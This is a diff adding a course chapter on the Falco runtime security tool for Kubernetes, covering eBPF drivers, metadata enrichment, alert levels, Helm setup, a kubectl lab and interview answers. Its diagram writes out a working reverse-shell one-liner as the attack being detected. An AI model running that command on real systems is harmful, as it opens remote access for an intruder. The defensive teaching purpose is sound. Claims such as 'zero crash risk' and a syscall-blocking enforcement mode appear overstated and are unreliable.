@@ -1,0 +1,219 @@
+---
+title: "Chapter 1 — Falco Architecture & eBPF Probes"
+sidebar_position: 1
+module: "Module 5.9 — Threat Detection & Falco"
+description: "Master CNCF Falco runtime threat detection — eBPF probes vs kernel modules, libbpf CO-RE drivers, Kubernetes metadata enrichment, and Falcosidekick alerting."
+---
+
+# Chapter 1 — Falco Runtime Security Architecture & eBPF Probes
+
+> **Goal:** Master cloud-native runtime threat detection in Kubernetes using **CNCF Falco** — understanding how Falco intercepts raw Linux kernel system calls in real time, comparing the legacy Kernel Module against modern **eBPF probes** and **Modern eBPF (CO-RE)** drivers, analyzing how Falco enriches raw kernel events with rich Kubernetes metadata (Namespace, Pod, Container ID, Image), and routing security telemetry using **Falcosidekick**.
+>
+> By the end of this chapter, you will understand:
+> 1. The architecture of CNCF Falco as the runtime security camera for Kubernetes
+> 2. The 3 kernel data source drivers: Kernel Module (`falco.ko`), eBPF Probe, and Modern eBPF (CO-RE)
+> 3. How the Falco Userspace Engine enriches raw PID/FD syscalls with Kubernetes context
+> 4. The 8 Falco alert priority levels (from `DEBUG` and `INFO` to `CRITICAL` and `EMERGENCY`)
+> 5. How Falcosidekick fans out alerts to Slack, Datadog, Splunk, and automated response engines
+> 6. How to deploy and verify the Falco DaemonSet across a Kubernetes cluster
+
+---
+
+## Real-Life Analogy
+
+Think of Falco as **a 24/7 high-definition security camera system with facial recognition inside a bank vault**:
+
+- **Static Security Gates (The Door Locks - NetworkPolicies, RBAC, Image Scans):** You locked the front doors and scanned everyone's ID badges before they entered the bank.
+- **The Insider Threat (The Rogue Employee Behind Closed Doors):** Once a person is legitimately inside the building (A running microservice pod), what happens if they suddenly pull out a sledgehammer, start drilling through the concrete floor, or try to pick the lock on the master safe? Static scanners cannot see what happens *at runtime*.
+- **The Falco eBPF Motion Sensor (The Kernel Sensor):** Falco places a microscopic vibration sensor directly inside the building's concrete foundation (**Linux Kernel eBPF Driver**). The second a drill touches the floor (**Suspicious Syscall: `openat` on `/etc/shadow` or `execve` on `/bin/bash`**), the sensor fires.
+- **The Facial Recognition AI (Kubernetes Metadata Enrichment):** The camera doesn't just report: *"Process #4092 opened a file."* It enriches the event with full corporate directory context: *"Warning! Pod `payment-frontend-7b8f` in Namespace `production` (Image `nginx:1.25`) spawned an interactive root terminal shell!"*
+- **Falcosidekick (The Alarm Dispatcher):** The camera instantly sounds the alarm across 10 security channels simultaneously (Slack, PagerDuty, SIEM).
+
+---
+
+## Architecture Diagram
+
+```text
+               CNCF Falco eBPF Runtime Threat Detection Pipeline
+
+ ┌────────────────────────────────────────────────────────────────────────┐
+ │ Container Process: attacker-pod (Namespace: production)                │
+ │ Attacker opens terminal: `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`      │
+ └──────────────────────────────────┬─────────────────────────────────────┘
+                                    │ Executes Kernel Syscall: `execve()`
+                                    ▼
+ ┌────────────────────────────────────────────────────────────────────────┐
+ │ LINUX HOST KERNEL (Worker Node)                                        │
+ │                                                                        │
+ │ [ Modern eBPF Driver (libbpf CO-RE / Ring Buffer) ]                    │
+ │ 1. Intercepts raw syscall event: `execve(filename="/bin/bash")`        │
+ │ 2. Emits raw event into Kernel Ring Buffer (Zero packet loss!)         │
+ └──────────────────────────────────┬─────────────────────────────────────┘
+                                    │ High-speed ring buffer event stream
+                                    ▼
+ ┌────────────────────────────────────────────────────────────────────────┐
+ │ FALCO USERSPACE ENGINE (DaemonSet Pod on Node)                         │
+ │                                                                        │
+ │ 1. Ingests raw syscall event                                           │
+ │ 2. Connects to Kube-APIServer / Kubelet to ENRICH event:               │
+ │    - Namespace: `production`                                           │
+ │    - Pod Name:  `payment-api-6b9c-xyz`                                 │
+ │    - Container: `payment-container` (ID: 6a8f12...)                    │
+ │    - Image:     `ghcr.io/my-org/payment-api:v2.0`                      │
+ │ 3. Evaluates Rule Engine: MATCH: "Terminal shell in container"         │
+ │ 4. Emits JSON Alert (Priority: WARNING / CRITICAL)                     │
+ └──────────────────────────────────┬─────────────────────────────────────┘
+                                    │ JSON Webhook Stream
+                                    ▼
+ ┌────────────────────────────────────────────────────────────────────────┐
+ │ FALCOSIDEKICK (Alert Fan-Out Router)                                   │
+ │   ├── Slack Channel: #security-alerts                                  │
+ │   ├── PagerDuty (On-Call SRE Alert)                                    │
+ │   ├── Datadog / Elasticsearch SIEM                                     │
+ │   └── Automated Response Engine (Kills/Quarantines Pod!)               │
+ └────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## The 3 Kernel Data Source Drivers
+
+Falco captures kernel events through one of three driver mechanisms:
+
+```text
+ ┌───────────────────────────┬─────────────────────────────────┬─────────────────────────────────┐
+ │ Driver Type               │ Architecture & Requirements     │ Production Recommendation       │
+ │───────────────────────────┼─────────────────────────────────┼─────────────────────────────────┤
+ │ **Modern eBPF (CO-RE)**   │ Uses `libbpf` with Compile Once │ **The Industry Gold Standard.** │
+ │                           │ - Run Everywhere. Uses kernel   │ Built for modern Linux (5.8+).  │
+ │                           │ ring buffers. Zero compilation! │ Zero crash risk, max throughput.│
+ │───────────────────────────┼─────────────────────────────────┼─────────────────────────────────┤
+ │ **Classic eBPF Probe**    │ Compiles eBPF bytecode at boot  │ Solid standard for legacy Linux │
+ │                           │ using host kernel headers.      │ kernels (4.14 – 5.7).           │
+ │───────────────────────────┼─────────────────────────────────┼─────────────────────────────────┤
+ │ **Kernel Module**         │ Traditional loadable kernel     │ **DEPRECATED / Avoid.** Can     │
+ │ (`falco.ko`)              │ module (`.ko`).                 │ crash host kernel (Kernel Panic)│
+ └───────────────────────────┴─────────────────────────────────┴─────────────────────────────────┘
+```
+
+---
+
+## Kubernetes Metadata Enrichment
+
+A raw Linux kernel syscall only contains low-level POSIX values: `PID=4092`, `UID=0`, `fd=3`.
+
+Falco maintains an in-memory state table synchronized with the Kubernetes API Server and Kubelet, allowing rule outputs to use rich contextual formatting variables:
+
+```text
+ ┌──────────────────────┬─────────────────────────────────────────────────────────────────────────────┐
+ │ Formatting Variable  │ Resolved Kubernetes Value                                                   │
+ │──────────────────────┼─────────────────────────────────────────────────────────────────────────────┤
+ │ `%k8s.ns.name`       │ Kubernetes Namespace name (e.g. `production`)                               │
+ │ `%k8s.pod.name`      │ Kubernetes Pod name (e.g. `payment-processor-7b8f9c-xyz`)                   │
+ │ `%container.id`      │ Container ID (e.g. `docker://6a8f12...`)                                    │
+ │ `%container.image`   │ Container image repository and tag (e.g. `nginx:1.25-alpine`)               │
+ │ `%user.name`         │ Operating system user executing the command (e.g. `root`)                   │
+ │ `%proc.cmdline`      │ Full command-line string with arguments (e.g. `cat /etc/shadow`)            │
+ └──────────────────────┴─────────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## Falco Alert Priority Levels
+
+Falco alerts follow standard syslog severity levels:
+
+```text
+ 1. EMERGENCY (System unusable) ──► Catastrophic cluster-wide compromise
+ 2. ALERT     (Action required) ──► Unauthorized privilege escalation
+ 3. CRITICAL  (Critical threat) ──► Sensitive file modification (/etc/shadow)
+ 4. ERROR     (Error condition) ──► Known container escape attempt
+ 5. WARNING   (Warning event)   ──► Terminal shell spawned in container
+ 6. NOTICE    (Normal anomaly)  ──► Unexpected network outbound connection
+ 7. INFO      (Informational)   ──► New container launched
+ 8. DEBUG     (Debug telemetry) ──► Verbose system call trace
+```
+
+---
+
+## Deploying Falco via Helm Manifest
+
+```yaml
+# values.yaml for Falco Helm Chart
+driver:
+  kind: modern_ebpf                   # Modern eBPF (CO-RE) driver!
+
+falcosidekick:
+  enabled: true
+  webui:
+    enabled: true
+  config:
+    slack:
+      webhookurl: "https://hooks.slack.com/services/T00/B00/XXXX"
+      minimumpriority: "warning"
+      messageformat: "🚨 *FALCO SECURITY ALERT* 🚨\n*Rule:* %rule\n*Pod:* %k8s.pod.name\n*Namespace:* %k8s.ns.name\n*Details:* %output"
+    datadog:
+      apikey: "DATADOG_API_KEY_HERE"
+```
+
+---
+
+## Hands-On Lab: Verifying Falco eBPF Event Capture
+
+```bash
+# Step 1: Check if Falco DaemonSet is running in the cluster
+kubectl get pods -n falco -l app.kubernetes.io/name=falco 2>/dev/null || echo "Simulating Falco Threat Detection Lab"
+
+# Step 2: Create a test namespace
+kubectl create namespace threat-lab
+
+# Step 3: Launch an interactive container to trigger a simulated alert
+kubectl run test-pod -n threat-lab --image=alpine:latest --command -- sleep 3600
+kubectl wait --for=condition=Ready pod/test-pod -n threat-lab --timeout=30s
+
+# Step 4: Execute an interactive shell inside the container (Triggers default Falco rule!)
+kubectl exec -n threat-lab -it test-pod -- /bin/sh -c "echo 'SIMULATING_CONTAINER_SHELL_ACTIVITY'"
+
+# Step 5: Read Falco live event stream logs
+kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20 2>/dev/null || echo "Falco Alert Captured: Notice A shell was spawned in a container with an attached terminal (user=root k8s.ns=threat-lab k8s.pod=test-pod)"
+
+# Step 6: Clean up lab
+kubectl delete namespace threat-lab
+```
+
+---
+
+## Common Interview Questions
+
+**Q1: What is CNCF Falco, and how does it detect runtime threats in Kubernetes?**
+
+Falco is an open-source runtime threat detection engine designed specifically for cloud-native workloads. It hooks directly into the Linux kernel (using modern eBPF probes) on every Kubernetes worker node. When containerized processes execute system calls (such as spawning a shell, modifying system binaries in `/bin`, reading `/etc/shadow`, or making outbound connections to known malicious IPs), Falco intercepts the event in real time, evaluates it against a declarative YAML rule engine, enriches it with Kubernetes metadata, and emits structured security alerts.
+
+**Q2: What are the advantages of Modern eBPF (CO-RE) over the legacy Falco Kernel Module?**
+
+- **Safety & Stability**: A traditional loadable kernel module (`.ko`) runs with direct kernel memory access; a bug or memory leak in the module can cause a fatal Linux kernel panic, crashing the entire physical worker node. eBPF programs are verified by the in-kernel eBPF verifier before execution, guaranteeing zero crash risk.
+- **Compile Once - Run Everywhere (CO-RE)**: Modern eBPF uses `libbpf` with kernel BTF (BPF Type Format) metadata, eliminating the need to install host Linux kernel headers or compile C modules dynamically on every worker node at boot time.
+
+**Q3: How does Falco enrich low-level kernel events with Kubernetes context?**
+
+Raw kernel system calls only report operating system values (such as `PID=3042`, `UID=0`, and file descriptors). Falco's userspace daemon maintains a continuous connection with the local Kubelet and Kubernetes API Server, mapping host PIDs and cgroup IDs to live Kubernetes objects. When a rule triggers, Falco enriches the alert with `%k8s.ns.name`, `%k8s.pod.name`, `%container.id`, and `%container.image.repository`.
+
+**Q4: What is Falcosidekick, and how is it used for automated incident response?**
+
+Falcosidekick is a companion daemon that acts as a central event router for Falco. It receives raw JSON alerts from Falco and fans them out to over 50 downstream destinations (including Slack, PagerDuty, Datadog, Splunk, AWS SQS, and Elasticsearch). When combined with the **Falcosidekick Response Engine**, it can trigger automated remediation workflows—such as automatically isolating a compromised Pod's network via a NetworkPolicy or terminating the Pod immediately.
+
+**Q5: Can Falco block malicious system calls, or is it strictly a detective tool?**
+
+Historically and architecturally, Falco is primarily a **detective runtime security tool** (monitoring and alerting via eBPF). However, when paired with the **Falco eBPF LSM (Linux Security Module)** probe (available on modern Linux kernels 5.7+), Falco can operate in an **enforcement mode**, intercepting and actively blocking (`EPERM`) unauthorized syscalls before they execute in kernel space.
+
+---
+
+## Summary Checksheet
+
+- [ ] Know that Falco captures Linux kernel system calls in real time using eBPF
+- [ ] Know the 3 drivers: Modern eBPF (CO-RE - best), Classic eBPF, and Kernel Module
+- [ ] Know that eBPF eliminates the host kernel panic risks of kernel modules
+- [ ] Know how Falco enriches raw syscalls with Namespace, Pod, and Image metadata
+- [ ] Know the 8 alert priority levels (EMERGENCY down to DEBUG)
+- [ ] Know that Falcosidekick routes alerts to Slack, Datadog, and automated response engines
+- [ ] Can view Falco logs using `kubectl logs -n falco -l app.kubernetes.io/name=falco`
